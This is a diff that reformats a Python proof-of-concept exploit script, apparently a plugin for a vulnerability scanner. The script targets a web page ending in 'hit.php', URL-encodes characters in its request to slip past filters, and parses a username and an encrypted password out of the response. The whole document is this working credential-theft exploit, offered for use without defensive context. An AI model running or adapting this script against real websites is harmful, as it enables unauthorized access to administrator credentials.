@@ -1,9 +1,13 @@
-from lib.core.data import target
-from requests import Request, Session
 import re
+
+from requests import Request, Session
+
+from lib.core.data import target
+
+
 def poc():
     try:
-        if  not target.url.endswith("hit.php"):
+        if not target.url.endswith("hit.php"):
             print("[*] Please make sure the url end with 'hit.php'")
             exit()
         s = Session()
@@ -16,9 +20,10 @@ def poc():
         prepped.url = prepped.url.replace('e', '%65')
         resp = s.send(prepped)
         p = re.compile("(?<=document.write\(1<br>)(.*)(?=<br>\);)")
-        result = re.search(p,resp.text).group(0).split('<br>')
-        print("[*] Get the username : "+ result[0])
-        print("[*] Get the password(encrypted) : "+ result[1])
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
-    except (KeyError,AttributeError) as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        result = re.search(p, resp.text).group(0).split('<br>')
+        print("[*] Get the username : " + result[0])
+        print("[*] Get the password(encrypted) : " + result[1])
+    except (KeyError, AttributeError) as e:
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
